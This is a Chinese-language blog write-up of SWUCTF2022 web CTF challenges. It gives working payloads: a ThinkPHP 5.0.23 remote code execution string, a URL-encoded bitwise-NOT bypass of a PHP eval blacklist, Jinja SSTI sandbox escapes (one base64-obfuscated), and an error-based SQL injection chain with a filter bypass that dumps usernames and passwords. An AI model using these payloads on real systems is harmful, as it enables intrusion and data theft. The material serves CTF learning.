<!DOCTYPE html><html lang=zh-CN><head><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><title>SWUCTF2022 Web Writeups | CTF | Blog | btwoa</title><meta name=description content="SWUCTF2022 Web Writeups | CTF | btwoa"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=https://ovo.btwoa.com/favicon/hexo/favicon.png><link rel=stylesheet href=/css/apollo.css><link rel=search type=application/opensearchdescription+xml href=https://blog.btwoa.com/atom.xml title="Blog | btwoa"><script integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq src=//instant.page/5.1.1 type=module></script><!-- hexo injector head_end start --><link rel=manifest href=/manifest.json><!-- hexo injector head_end end --><meta name=generator content="Hexo 6.2.0"><link rel=alternate href=/atom.xml title="Blog | btwoa" type=application/atom+xml><link rel=alternate href=/rss.xml title="Blog | btwoa" type=application/rss+xml></head><body><div class=container data-bs-spy=scroll data-bs-target=#toc-nav data-bs-offset=0></div><div class=wrap><header><a class=logo-link href=/ ><img src=https://ovo.btwoa.com/blog.webp alt=logo></a><ul class="nav nav-list"><li class=nav-list-item><a class=nav-list-link href=https://btwoa.com target=_blank>主页</a></li><li class=nav-list-item><a class=nav-list-link href=/talk/ target=_self>说说</a></li><li class=nav-list-item><a class=nav-list-link href=/circle/ target=_self>小圈</a></li><li class=nav-list-item><a class=nav-list-link href=/link/ target=_self>友链</a></li><li class=nav-list-item><a class=nav-list-link href=/archives/ target=_self>归档</a></li><li class=nav-list-item><a class=nav-list-link href=https://monitor.btwoa.com target=_blank>监测</a></li></ul></header><main class=container><article class=post-block><h1 class=post-title>SWUCTF2022 Web Writeups | CTF</h1><div class=post-info>2022年5月24日<div class=post-tags><a class=post-tag-link href=/tags/SWUCTF/ rel=tag># SWUCTF</a> <a class=post-tag-link href=/tags/Writeup/ rel=tag># Writeup</a></div></div><div class=post-toc><h3 class=post-toc-title>SWUCTF2022 Web Writeups | CTF</h3><nav class=navbar id=toc-nav><ol class=nav><li class="nav-item nav-level-1"><a class=nav-link href=#THINKPHP><span class=nav-text>THINKPHP?</span></a></li><li class="nav-item nav-level-1"><a class=nav-link href=#PHP-Eval><span class=nav-text>PHP? Eval?</span></a><ol class=nav-child><li class="nav-item nav-level-2"><a class=nav-link href=#URL%E7%BC%96%E7%A0%81%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87><span class=nav-text>URL编码取反绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class=nav-link href=#Py-py><span class=nav-text>Py?py</span></a></li><li class="nav-item nav-level-1"><a class=nav-link href=#SQL-no-sqlmap><span class=nav-text>SQL? no sqlmap</span></a></li></ol></nav></div><div class=post-content><p>好多题不会，救</p><span id=more></span><h1 id=THINKPHP><a href=#THINKPHP class=headerlink title=THINKPHP?></a>THINKPHP?</h1><p>?s&#x3D;captcha</p><p><img src=https://ovo.btwoa.com/img/webp/202205242206767.webp></p><p>V5.0.23</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=env</span><br></pre></td></tr></table></figure><p><img src=https://ovo.btwoa.com/img/webp/202205242209220.webp></p><h1 id=PHP-Eval><a href=#PHP-Eval class=headerlink title="PHP? Eval?"></a>PHP? Eval?</h1><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br></pre></td><td class=code><pre><span class=line>&lt;?php</span><br><span class=line>highlight_file(__FILE__);</span><br><span class=line>error_reporting(0);</span><br><span class=line>$blacklist = [&quot;system&quot;, &quot;ini_set&quot;, &quot;exec&quot;, &quot;scandir&quot;, &quot;shell_exec&quot;, &quot;proc_open&quot;, &quot;error_log&quot;, &quot;ini_alter&quot;, &quot;ini_set&quot;, &quot;pfsockopen&quot;, &quot;readfile&quot;, &quot;echo&quot;, &quot;file_get_contents&quot;, &quot;readlink&quot;, &quot;symlink&quot;, &quot;popen&quot;, &quot;fopen&quot;, &quot;file&quot;, &quot;fpassthru&quot;];</span><br><span class=line>$blacklist = array_merge($blacklist, get_defined_functions()[&#x27;internal&#x27;]);</span><br><span class=line>foreach($blacklist as $i)&#123;</span><br><span class=line>    if(stristr($_GET[cmd], $i)!==false)&#123;</span><br><span class=line>        die(&#x27;hack&#x27;);</span><br><span class=line>    &#125;</span><br><span class=line>&#125;</span><br><span class=line>eval($_GET[cmd]);</span><br><span class=line>?&gt;</span><br></pre></td></tr></table></figure><h2 id=URL编码取反绕过><a href=#URL编码取反绕过 class=headerlink title=URL编码取反绕过></a>URL编码取反绕过</h2><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><span class=line>php -r &quot;var_dump(urlencode(~&#x27;system&#x27;));&quot; =&gt; string(18) &quot;%8C%86%8C%8B%9A%92&quot;</span><br><span class=line>php -r &quot;var_dump(urlencode(~&#x27;cat /flag&#x27;));&quot; =&gt; string(27) &quot;%9C%9E%8B%DF%D0%99%93%9E%98&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span><br></pre></td></tr></table></figure><p><img src=https://ovo.btwoa.com/img/webp/202205242250287.webp></p><h1 id=Py-py><a href=#Py-py class=headerlink title=Py?py></a>Py?py</h1><p><a target=_blank rel=noopener href=https://www.anquanke.com/post/id/188172#h3-15>SSTI&#x2F;沙盒逃逸详细总结-CoCo1er</a></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br></pre></td><td class=code><pre><span class=line>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125;</span><br><span class=line></span><br><span class=line>&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IGZsYWcudHh0JykucmVhZCgp&quot;.decode(&#x27;base64&#x27;))&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src=https://ovo.btwoa.com/img/webp/202205250017411.webp></p><h1 id=SQL-no-sqlmap><a href=#SQL-no-sqlmap class=headerlink title="SQL? no sqlmap"></a>SQL? no sqlmap</h1><p><img src=https://ovo.btwoa.com/img/webp/202205242255472.webp></p><p>报错注入</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,version(),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2Cversion%28%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p>~10.3.18-MariaDB~</p><p><img src=https://ovo.btwoa.com/img/webp/202205242301210.webp></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2Cdatabase%28%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p>~vaalacat~</p><p><img src=https://ovo.btwoa.com/img/webp/202205242300745.webp></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2C%28select%28group_concat%28table_name%29%29from%28information_schema.tables%29where%28table_schema%29like%28database%28%29%29%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p><img src=https://ovo.btwoa.com/img/webp/202205242304240.webp></p><p>过滤了 select</p><p>双写绕过</p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2C%28selselectect%28group_concat%28table_name%29%29from%28information_schema.tables%29where%28table_schema%29like%28database%28%29%29%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p>~vaala~</p><p><img src=https://ovo.btwoa.com/img/webp/202205242307692.webp></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,(selselectect(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;vaala&#x27;)),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2C%28selselectect%28group_concat%28column_name%29%29from%28information_schema.columns%29where%28table_name%29like%28%27vaala%27%29%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p>~id,username,password~</p><p><img src=https://ovo.btwoa.com/img/webp/202205242310530.webp></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,(selselectect(group_concat(username,&#x27;~&#x27;,password))from(vaala)),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2C%28selselectect%28group_concat%28username%2C%27~%27%2Cpassword%29%29from%28vaala%29%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p>‘~vaala~flag{ccb506e8-afa0-46b8-b’</p><p><img src=https://ovo.btwoa.com/img/webp/202205242312864.webp></p><figure class="highlight plaintext"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><span class=line>&#x27;or(updatexml(1,concat(0x7e,(selselectect(group_concat((right(password,30))))from(vaala)),0x7e),1))# =&gt; %27or%28updatexml%281%2Cconcat%280x7e%2C%28selselectect%28group_concat%28%28right%28password%2C30%29%29%29%29from%28vaala%29%29%2C0x7e%29%2C1%29%29%23</span><br></pre></td></tr></table></figure><p><img src=https://ovo.btwoa.com/img/webp/202205242316572.webp></p><p>‘<del>8-afa0-46b8-b177-e3a2fc5592b6}</del>‘</p><p>flag{ccb506e8-afa0-46b8-b177-e3a2fc5592b6}</p><link rel=stylesheet href=/css/spoiler.css type=text/css><script src=/js/spoiler.js type=text/javascript async></script></div></article></main><footer><div class=paginator><a class=prev href=/1f30b8ca/ >PREV</a><a class=next href=/f8f1c502/ >NEXT</a></div><div id=tcomment></div><script src=/js/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.btwoa.com/",el:"#tcomment",path:"window.location.pathname",lang:"zh-CN"})</script><div class=copyright><p>Copyright Ⓒ 2019-2022 <a href=https://beian.miit.gov.cn/ target=_blank>陇ICP备20001210号</a></p></div></footer></div><script>!function(e,a,t,g,n,o){e.GoogleAnalyticsObject=g,e.ga||(e.ga=function(){(e.ga.q=e.ga.q||[]).push(arguments)}),e.ga.l=+new Date,n=a.createElement(t),o=a.getElementsByTagName(t)[0],n.src="/js/google-analytics.js",o.parentNode.insertBefore(n,o)}(window,document,"script","ga"),ga("create","UA-235222810-1","auto"),ga("send","pageview")</script><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?01b308cf7144f10b91966ae6f284d4cb",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)}()</script><script>!function(t){"use strict";function s(){e.LA.ids.push(i)}var e=window,c=document,i=t,o="".concat("https:"===c.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),n=c.createElement("script"),c=c.getElementsByTagName("script")[0];n.type="text/javascript",n.setAttribute("charset","UTF-8"),n.async=!0,n.src=o,n.id="LA_COLLECT",i.d=n,e.LA?e.LA.ids&&s():(e.LA=t,e.LA.ids=[],s()),c.parentNode.insertBefore(n,c)}({id:"JoXIxCzhNG7DwlUJ",ck:"JoXIxCzhNG7DwlUJ"})</script><script>!function(e,n){var t=n.createElement("script"),n=n.getElementsByTagName("script")[0];t.type="text/javascript",t.crossorigin=!0,t.onload=function(){(new e.LingQue.Monitor).init({id:"JoewdpDnTBrOF23U",sendSuspicious:!0,sendSpaPv:!0})},n.parentNode.insertBefore(t,n),t.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script defer=defer src=/js/bootstrap.min.js type=text/javascript></script><script defer=defer src=/js/console.js type=text/javascript></script><!-- hexo injector body_end start --><script>"serviceWorker"in navigator&&window.addEventListener("load",()=>{navigator.serviceWorker.register("/sw.js")})</script><!-- hexo injector body_end end --></body></html>